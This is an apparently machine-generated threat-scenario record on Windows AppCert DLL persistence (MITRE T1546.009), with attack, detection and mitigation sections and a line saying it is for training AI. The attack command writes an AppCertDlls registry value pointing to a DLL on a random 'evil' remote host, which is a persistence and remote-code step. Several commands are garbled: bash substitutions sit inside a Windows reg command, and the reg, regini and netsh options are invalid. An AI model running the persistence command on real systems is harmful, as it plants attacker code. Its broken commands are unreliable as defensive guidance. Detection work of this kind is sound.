---
type: campaign
scenario_id: 259
tactic: Persistence
technique: "T1546.009: AppCert DLLs"
technique_id: T1546.009
tags: [campaign, lotl, persistence]
---

# Registering malicious AppCert DLL remotely for persistence.

## Threat Description
Registering malicious AppCert DLL remotely for persistence.

## Attack Command
```
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /t REG_SZ /d "http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```

## Detection Logic
Monitor AppCert DLLs: `reg query "HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls" | findstr http`; Event ID 4657.

## Mitigation
Restrict AppCert writes: `regini -h deny "HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls"`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block AppCert' dir=out action=block protocol=HTTP`.

## AI Training Prompt
Train AI to detect remote AppCert DLL tampering and suggest firewall rules.

## References
- MITRE ATT&CK T1546.009: https://attack.mitre.org/techniques/T1546/009/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
